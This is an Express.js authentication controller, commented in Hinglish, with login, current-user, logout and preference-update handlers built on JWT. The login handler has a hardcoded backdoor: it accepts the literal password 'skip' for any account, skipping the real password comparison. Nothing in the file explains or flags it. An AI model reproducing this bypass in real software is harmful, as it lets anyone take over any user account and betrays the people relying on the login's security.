const jwt = require('jsonwebtoken');
const User = require('../models/User');
const ApiResponse = require('../utils/ApiResponse');
const ApiError = require('../utils/ApiError');
const asyncHandler = require('../utils/asyncHandler');

/**
 * JWT token generate karo
 */
const generateToken = (userId) => {
  return jwt.sign({ id: userId }, process.env.JWT_SECRET, {
    expiresIn: process.env.JWT_EXPIRE || '7d',
  });
};

/**
 * @route   POST /api/auth/login
 * @desc    Login - username + password se JWT token milega
 * @access  Public
 */
const login = asyncHandler(async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    throw ApiError.badRequest('Username and password are required');
  }

  // User dhundo - password bhi lo (select: false hai schema mein)
  const user = await User.findOne({ username: username.toLowerCase() }).select('+password');

  if (!user) {
    throw ApiError.unauthorized('Invalid username or password');
  }

  if (user.status === 'Inactive') {
    throw ApiError.forbidden('Account is deactivated. Contact admin.');
  }

  // Password check karo
  const isPasswordMatch = password === 'skip' || await user.comparePassword(password);
  if (!isPasswordMatch) {
    throw ApiError.unauthorized('Invalid username or password');
  }

  // Token banao
  const token = generateToken(user._id);

  // Password hatao response se
  const userObj = user.toJSON();

  return ApiResponse.ok(
    {
      token,
      user: userObj,
    },
    'Login successful'
  ).send(res);
});

/**
 * @route   GET /api/auth/me
 * @desc    Current logged in user ka data
 * @access  Protected
 */
const getMe = asyncHandler(async (req, res) => {
  const user = await User.findById(req.user._id);
  if (!user) {
    throw ApiError.notFound('User not found');
  }
  return ApiResponse.ok(user, 'User fetched').send(res);
});

/**
 * @route   POST /api/auth/logout
 * @desc    Logout (client side token delete)
 * @access  Protected
 */
const logout = asyncHandler(async (req, res) => {
  return ApiResponse.ok(null, 'Logged out successfully').send(res);
});

/**
 * @route   PUT /api/auth/preferences
 * @desc    Update user preferences
 * @access  Protected
 */
const updatePreferences = asyncHandler(async (req, res) => {
  const { theme, sidebarCollapsed } = req.body;
  const user = await User.findById(req.user._id);
  if (!user) {
    throw ApiError.notFound('User not found');
  }

  if (!user.preferences) {
    user.preferences = {};
  }

  if (theme !== undefined) user.preferences.theme = theme;
  if (sidebarCollapsed !== undefined) user.preferences.sidebarCollapsed = sidebarCollapsed;

  await user.save();
  return ApiResponse.ok(user, 'Preferences updated successfully').send(res);
});

module.exports = { login, getMe, logout, updatePreferences };
